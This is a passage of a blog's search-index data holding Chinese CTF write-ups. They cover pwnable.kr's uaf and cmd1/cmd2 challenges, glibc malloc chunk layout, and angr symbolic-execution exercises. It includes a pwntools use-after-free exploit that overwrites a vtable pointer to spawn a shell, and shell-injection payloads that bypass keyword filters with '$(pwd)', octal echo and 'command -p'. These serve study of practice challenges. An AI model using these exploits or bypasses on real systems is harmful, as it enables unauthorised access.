breakp.close()sh.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr uaf","slug":"CTF/pwn/pwnable/pwnable..kr-uaf","date":"2021-07-14T04:44:16.830Z","updated":"2021-08-08T09:33:45.835Z","comments":true,"path":"32386/","link":"","permalink":"http://example.com/32386/","excerpt":"","text":"源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public:Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; Ues After Free​ uaf的原理其实并不难懂，首先需要一个迷途指针，也称为野指针，这个指针时因为在使用玩分配的堆空间后没有将指向堆的指针制空造成的，利用野指针我们可以向这块堆中写入一些东西，然后在申请堆空间，在释放完后马上又申请会申请到那段刚刚释放的堆空间。 这个是最简单的uaf程序 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; char *p0; p0=(char *)malloc(sizeof(char)*10); //指针p0申请内存； memcpy(p0,&quot;hello&quot;,10); printf(&quot;p0 Addr:%x,%s\\n&quot;,p0,p0); //打印其地址与值； free(p0); //释放p0； char *p1; p1==(char *)malloc(sizeof(char)*10); memcpy(p1,&quot;word&quot;,10); printf(&quot;p1 Addr:%x,%s\\n&quot;,p1,p0); return 0;&#125; C++的一些知识点多态​ 这个概念在在wiki上解释得非常抽象，但是上面的源码其实挺适合我们理解的，Man和Woman都继承了Person这个类，introduce这个动作是所有人都有的，但是细分到Man和Woman时他们之间的introduce又不一样了，这就是多态。 ​ 我的理解为，在于参考系的不同，这样就存在宏观与微观的区别。。怪异的理解。 虚表​ c++面向对象编程的多态性需要由虚表来实现。 ​ 虚表通俗来讲就是一个函数指针数组，这个数组里面的指针指向了类中的虚函数，但是虚函数表并不存放在类中，类中只有一个指针指向虚函数表。而在c++中同一个类的对象共用一张虚表。 类在内存中的结构12345678910111213+------------------------+ virtual talbe + virtual table pointer + ----&gt; +---------------+ +------------------------+ + func1 pointer + + characteristic _ 1 + + --------------++------------------------+ + func2 pointer ++ characteristic _ 2 + +---------------++------------------------+ + func3 pointer ++ characteristic _ 3 + +---------------++------------------------++ ........... ++------------------------++ characteristic _ n ++------------------------+ 程序分析分析 程序开始申请了两块内存 12Human* m = new Man(&quot;Jack&quot;, 25);Human* w = new Woman(&quot;Jill&quot;, 21); 用户选择菜单（1.调用方法。2.申请内存，读入参数。3.释放内存） 12345678910111213141516switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break;&#125; 可以发现程序没有对释放内存后的指针置空，存在野指针，而选择而又可以申请内存，满足UAF漏洞的触发条件。初步的想法就是先3在2（先释放后申请），在向申请的空间中写入东西，现在的问题是写什么进去。释放的空间是类，写入的数据改变的是类，如果类有虚函数，那么类结构的开头就是虚表指针。我们改变的就是虚表指针，改变虚表指针的作用可以通过IDA查看反编译代码来学习 IDA反编译来理解虚函数表跟踪变量v12和v13 下面这里有点难看懂，如指针没有学好看这种一定会看晕。我尽量写清楚一点 首先要明白v12,v13这两个变量存放的是对象虚表的地址，因为两个变量类型和操作方法一样，我只说v12就可以了 将v12强转成QWORD*类型，在取这个地址中的值，QWORD占8个字节，一次取8位，取出的这8位就是虚表的首地址 虚表首地址加+8，代表取虚表中的第二个函数指针 将函数指针赋值，在调用，参数就是对象本身（this指针)，如果不懂this指针去Google了解下，很重要。 利用​ 通过上面的分析，知道了调用虚函数其实是通过偏移来实现的，通过+8可以调用第二个虚函数，如果我们得到了虚函数表基址，并且改变，就可以控制函数调用我们想调用的虚函数，而程序为我们准备了这样一个虚函数，我们可以使用 123virtual void give_shell()&#123; system(&quot;/bin/sh&quot;);&#125; 通过IDA查找到Person函数的虚表地址是0x0000000000401590，将这个值-8，那么在调用的时候就刚好可以调用到give_shell这个函数 123456789101112131415161718# 本机exp，远程失败好像是我没有写文件的权限？from pwn import *vtable_addr = 0x0000000000401550filepath = &#x27;/home/fish/uaf/bash&#x27;#filepath = &#x27;/tmp/f1sh&#x27;write_stream = p64(vtable_addr - 8)with open(filepath, &#x27;wb&#x27;) as fp: fp.write(write_stream)Argv = [&#x27;/home/uaf/uaf&#x27;, &#x27;8&#x27;, filepath]p = process(executable = &#x27;./uaf&#x27;, argv = Argv )p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;3&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;1&#x27;)p.interactive() 这个是链接上服务器后手动getshell得到的结果","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr cmd1 cmd2","slug":"CTF/pwn/pwnable/pwnable.kr cmd1 cmd2","date":"2021-07-14T04:44:16.830Z","updated":"2021-08-08T09:34:24.640Z","comments":true,"path":"46930/","link":"","permalink":"http://example.com/46930/","excerpt":"","text":"cmd1linuxPATH入门教学linux命令通配符putenv函数讲解 这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法 method 1首先ssh登录，查看源码 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv(&quot;PATH=/thankyouverymuch&quot;); printf(&quot;%s\\n&quot;,getenv(&quot;PATH&quot;)); system(&quot;ls&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; 程序将PATH环境设置成了一个不存在的路径导致不能直接使用命令，而且filter函数过滤掉了我们输入的一些字符。 这里我们可以先来测试一下PATH如果被改变会怎么样，下面贴测试代码 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char**argv)&#123; //打印改变前的PATH，并且使用命令 printf(&quot;before PATH: %s\\n&quot;,getenv(&quot;PATH&quot;)); system(argv[1]); //改变PATH，将其设置成一个不存在的路径 putenv(&quot;PATH=/aaa&quot;); //再次打印路径 printf(&quot;after PATH: %s\\n&quot;, getenv(&quot;PATH&quot;)); system(argv[1]); return 0;&#125; 编译后运行，这里我们测试的命令是 ls ，可以发现ls命令已经失效了，由于PATH的路径被临时改变，需要使用ls命令的绝对路径 /bin/ls 再次测试，使用命令的绝对路径 /bin/ls，可以发现又可以正常运行了 所以这道题我们需要输入cat命令的绝对路径 /bin/cat，但是问题又来了，flag这个词被过滤掉了，这就需要使用到统配符了，我们可以使用 “/bin/cat f*“ 或者 “/bin/cat fla?” 等命令来实现查看flag 12./cmd1 &#x27;/bin/cat fla?&#x27;./cmd1 &#x27;/bin/cat f*&#x27; mommy now I get what PATH environment is for :) method 2第二种方法是我们采用shell编程方式，先创建一个文件，在利用程序打开我们的文件，在文件中，我们可以使用任意字符而不受限制 首先现在服务器的/tmp/目录下创建一个我们自己使用的目录，然后在目录中创建我们的文件，一会儿需要用程序来调用 在创建bash文件，文件名字里面千万不能带有过滤字符（我踩了这个坑😥），然后写入命令 让程序调用文件，一样可以达到效果 cmd2 cmd2的考点与cmd1大同小异，只是这一次源码中过滤了更多的字符，需要更高的技巧才能绕过字符过滤检测拿到flag，下面贴源码 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; 可以看到这次程序直接过滤了’/‘,’.’之类的符号，连路径都不让使用💔 下面我提供几种种方法（网上看到总结的，学习一手） 利用pwd利用$，我们可以进入到根目录，用$(pwd)来代替’/‘ 123cd //home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;/home/cmd2/cmd2 &quot;\\$(pwd)bin\\$(pwd)cat \\$(pwd)home\\$(pwd)cmd2\\$(pwd)f*&quot; 上面两种写法都可以，这是linux中双引号和单引号的区别，下面这篇文章可以了解他们之间的区别 Linux中单引号双引号的区别与用法 command -p12&#x27;command -p&#x27; //这条命令会强制将环境变为默认值，就不用使用绝对路径./cmd2 &#x27;command -p cat f*&#x27; echo解析8进制与16进制在网上看别人wp学的其实我觉得原理和第一个差不太多，这个是利用echo可以解析16进制和8进制表示的字符串（但是不能用参数 -e），具体情况要看系统版本。（我在网上看到他们在远程服务器上echo命令可以解释8进制，但我试了试就不行，还是记录下这个方法） 12345# 将 /bin/cat flag 转化为8进制from pwn import *cmd = &quot;/bin/cat flag&quot;print(&quot;\\\\&quot;+&quot;\\\\&quot;.join([oct(i) for i in ordlist(cmd)]))# \\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147 1./cmd2 &#x27;$(echo &quot;\\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147&quot;)&#x27; 我的本地虚拟机就不可以直接用echo命令转，需要参数-e set -s具体的原理还没有在网上找到，等后面补充 Bash 脚本 set 命令教程 12./cmd2 &#x27;set -s&#x27;&gt;/bin/cat flag 总结 shell编程点都不会，其实上学期学了的，只是上网课一点都没有认真听。。想在想起来有点傻，后面需要补习下shell的知识 linux的东西太灵活了。。其实上面的两道题还有几种其他的方法，但是我精力和时间有限，只收集了几种我感觉还可以的方法 我太菜了。。🐹","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwn heap[malloc_chunk结构体]","slug":"CTF/pwn/heap/malloc_chunk结构","date":"2021-07-14T04:44:16.790Z","updated":"2021-08-08T09:37:14.450Z","comments":true,"path":"19484/","link":"","permalink":"http://example.com/19484/","excerpt":"","text":"文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。 malloc_chunk结构体成员解析malloc_chunk结构定义 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a &quot;view&quot; into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 各个成员的作用 prev_size 如果该chunk物理地址相邻的前一chunk(两个指针的差值为前一个chunk大小)是空闲的chunk，这个字段记录的是前一个字符段的大小 用于储存物理地址相邻的chunk(低地址chunk)的信息 被共享，如果当前chunk大不够用，可以占用下一个chunk的prev_size字段 size 存储当前chunk的大小，chunk的大小内存申请，与SIZE_SZ有关，如果不是2*SIZE_SZ的整数倍，会自动向上取整到2*SIZE_SZ的整数倍，32位操作系统中SIZE_SZ是32位4个字节，64位操作系统中SIZE_SZ是64位8个字节。32位必须8字节对齐，64位必须16字节对齐，无论32位还是64位，size最后三位都没有用，所用可以用来存储其他信息 NON_MAIN_ARENA IS_MAPPED 记录当前chunk是否是由mmap申请 PREV_INUSE 记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 fd和bk chunk处于分配状态时，fd地址段存放的是用户数据。chunk在空闲的时候通过链表管理 fd指向上一个空闲（非物理空闲）的chunk bk指向下一个空闲（非物理空闲）的chunk fd_nextsize和bk_nextsize - chunk被使用时内存结构 1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) .next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ chunk被释放时内存结构 1234567891011121314151617chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&#x27; | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&#x27; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 内存对齐malloc函数申请的chunk地址都是8字节或者16字节对齐（32位8字节，64位16字节），所谓字节对齐，就是所有的地址最后8位或16位都是一样的（大多数时候为8的整数倍），常见的内存对齐有8字节对齐和16字节对齐 8字节对齐 地址的最后8位（2进制位）10进制表示为8 16字节对齐 地址的最后8位（2进制位）10进制表示为0 下面用pwndbg展示32位下chunk内存结构 pwndbg分析chunk在内存中的结构测试源码 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int* ptr1 = (int*)malloc(8); int* ptr2 = (int*)malloc(16); int* ptr3 = (int*)malloc(32); int* ptr4 = (int*)malloc(64); int* ptr5 = (int*)malloc(128); int* ptr6 = (int*)malloc(256); printf(&quot;ptr1-&gt;%p\\n&quot;, ptr1); printf(&quot;ptr2-&gt;%p\\n&quot;, ptr2); printf(&quot;ptr3-&gt;%p\\n&quot;, ptr3); printf(&quot;ptr4-&gt;%p\\n&quot;, ptr4); printf(&quot;ptr5-&gt;%p\\n&quot;, ptr5); printf(&quot;ptr6-&gt;%p\\n&quot;, ptr6); free(ptr1); free(ptr2); free(ptr3); free(ptr4); free(ptr5); free(ptr6); return 0;&#125; 32位程序 64位程序 heap命令查看所有堆信息 分析二进制数据 64位程序chunk结构与之类似","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"ctf_angr🦄[angr_0]","slug":"CTF/angr/ctf_angr_0","date":"2021-07-14T04:44:16.720Z","updated":"2021-08-08T09:38:13.332Z","comments":true,"path":"17540/","link":"","permalink":"http://example.com/17540/","excerpt":"","text":"ctf_angr一个用于练习angr的ctf题库，从入门到进阶，同时配套全英文ppt，从符号执行到angr详细使用方式，一站式入门👍 GitHub下载地址[链接] 00_angr_findida分析伪代码非常简单,执行流程为：输入-&gt;加密-&gt;比较-&gt;输出，分支少，所以遍历起来速度很快 伪代码易读，数据的字符串经过complex_function函数加密过后比较。 如果按照传统的方法，需要逆加密算法然后写出解密算法，但是angr不需要这些繁琐的操作，只需要告诉其实地址和目标地址，angr就会进行所有遍历，对符号进行约束，从而得出结果。 angr遍历求解首先贴出全代码以及运行结果，最后打印的值就是对符号不断约束求解得到的结果 12345678910111213141516import angrimport sysfilepath = &#x27;/home/fish/桌面/00_angr_find&#x27;project = angr.Project(filepath)initial_state = project.factory.entry_state()print_good_addr = 0x0804867Dsimulation = project.factory.simgr(initial_state)simulation.explore(find = print_good_addr)if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()))else: print(&#x27;Could not find the solution&#x27;) 使用angr过程 创建项目 首先用Project函数创建一个项目，Project参数为需要求解的二进制文件路径 1project = angr.Project(filepath) 告诉angr从哪儿开始执行 entry_state()表明从main函数开始执行（从头开始执行） 1initial_state = project.factory.entry_state() 创建模拟管理器 simgr是创建函数 1simulation = project.factory.simgr(initial_state) 开始探索二进制文件 explore函数需要遍历的结束地址，也就是这个二进制程序中打印字符串**Good Job.**的地址。 12print_good_address = 0x0804867Dsimulation.explore(find=print_good_address) 检查是否找到了解决方案 如果找到解决方案，found不为空（在pyhon中空代表false，不为空代表true）,将解决方案打印到屏幕输出端 12if simulation.found: solution_state = simulation.found[0] 总结主要过程创建工程 –&gt; 指定执行入口 –&gt; 创建二进制文件执行模拟器 –&gt; 探索各个分支 –&gt; 解出解决方案 –&gt; 打印结果 01_angr_avoid​ 这一次的文件较大，main函数在ida中不能F5，即便F5过后也可能因为伪代码较复杂无法阅读，所以在简单观察过后可以直接用angr看是否有解，但是作者这次在程序中加了一点料，方便我们学习avoid参数 should_succeed这个变量初始值为1本身并没有问题但是avoid_me函数会将should_succeed赋值为0。 ​ 所以这个如果要打印出**Good Job.**需要两个条件同时满足（should_succeed值为1，且输入的字符串加密过后满足条件），如果在遍历时不添加avoid条件会花费大量的时间（虽然结果一样），为了尽可能的节约时间，需要在遍历时避免avoid_me函数，所以在上一个的条件下，需要在添加其他条件，这里需要添加avoid 12avoid_addr = 0x080485A8 # avoid_me函数地址simgr.explore(find = good_addr, avoid = avoid_addr) # 添加avoid条件 02_angr_condtion出了在ida中直接寻找字符串地址，还可以自定义函数遍历所有字符串，寻找需要的字符串地址 12345678910111213# 自定义函数寻找字符串def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdoutdef is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout 完整脚本 12345678910111213141516171819202122232425262728293031323334353637from z3 import *import angrimport sysdef main(): filepath = &#x27;./02_angr_find_condition&#x27; project = angr.Project(filepath) init = project.factory.entry_state() simgr = project.factory.simgr(init) def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdout def is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout print(is_success) print(is_fail) simgr.explore(find=is_success, avoid=is_fail) if simgr.found: solution = simgr.found[0] flag = solution.posix.dumps(0) print(flag) else: raise Exception(&#x27;not find&#x27;)if __name__ == &quot;__main__&quot;: main()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"},{"name":"符号执行","slug":"符号执行","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"web","slug":"CTF/web","permalink":"http://example.com/categories/CTF/web/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"},{"name":"符号执行","slug":"符号执行","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"}]}